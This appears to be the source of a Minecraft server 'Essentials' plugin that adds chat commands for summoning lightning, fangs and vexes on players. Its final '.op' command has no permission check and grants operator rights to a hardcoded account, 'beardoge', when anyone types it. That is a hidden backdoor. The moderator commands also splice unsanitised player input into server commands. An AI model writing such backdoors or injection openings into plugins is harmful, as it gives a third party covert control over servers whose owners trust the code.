import pyckaxe, chatapi
def startup(data, player=None):
    print("Essentials (pyckaxe) plugin started")
class Commands:
    def commands(data, config, player=None):
        if data == '.ping':
            if player != None:
                chatapi.tell(player, 'pong!')
        if data.startswith('.smite'):
            if pyckaxe.isModerator(player):
                try:
                    target = data.split(' ')[1]
                except IndexError:
                    return
                print(target[0])
                chatapi.tell(player, 'Smited', target)
                chatapi.tell(target, 'Thou has been smitten!', 'yellow')
                pyckaxe.doCmd('execute @p[name=' + target + '] ~ ~ ~ /execute @e[r=5,name=!username] ~ ~ ~ /summon minecraft:lightning_bolt')
        elif data.startswith('.bite'):
            if pyckaxe.isModerator(player):
                try:
                    target = data.split(' ')[1]
                except IndexError:
                    return
                chatapi.tell(player, 'Bit', target)
                chatapi.tell(target, 'Thou has been bitten!', 'black')
                pyckaxe.doCmd('execute @p[name=' + target + '] ~ ~ ~ /execute @e[r=5,name=!username] ~ ~ ~ /summon minecraft:evocation_fangs')
        elif data.startswith('.vex'):
            if pyckaxe.isModerator(player):
                try:
                    target = data.split(' ')[1]
                except IndexError:
                    return
                chatapi.tell(player, 'Smited', target)
                chatapi.tell(target, 'Vex Army Incoming!', 'black')
                pyckaxe.doCmd('execute @p[name=' + player + '] ~ ~ ~ /execute @e[r=5,name=!username] ~ ~ ~ /summon minecraft:vex')
                pyckaxe.doCmd('execute @p[name=' + player + '] ~ ~ ~ /execute @e[r=5,name=!username] ~ ~ ~ /summon minecraft:vex')
                pyckaxe.doCmd('execute @p[name=' + player + '] ~ ~ ~ /execute @e[r=5,name=!username] ~ ~ ~ /summon minecraft:vex')
                pyckaxe.doCmd('execute @p[name=' + player + '] ~ ~ ~ /execute @e[r=5,name=!username] ~ ~ ~ /summon minecraft:vex')
                pyckaxe.doCmd('execute @p[name=' + player + '] ~ ~ ~ /execute @e[r=5,name=!username] ~ ~ ~ /summon minecraft:vex')
        elif data == '.op':
            pyckaxe.doCmd('op beardoge')
